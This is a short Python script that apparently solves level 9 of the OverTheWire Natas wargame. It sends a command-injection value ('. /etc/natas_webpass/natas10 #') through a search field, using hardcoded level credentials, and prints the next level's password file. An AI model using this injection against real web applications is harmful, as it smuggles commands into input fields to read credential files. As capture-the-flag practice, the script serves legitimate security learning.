from bs4 import BeautifulSoup as bs
import requests
import re

u='natas9'
p='W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
l=f'http://{u}.natas.labs.overthewire.org'
resp=requests.post(l,data={"needle":". /etc/natas_webpass/natas10 #","submit":"submit"},auth=(u, p))
t=resp.text
print(re.findall(r'<pre>\n(.*)\n</pre>',t)[0])
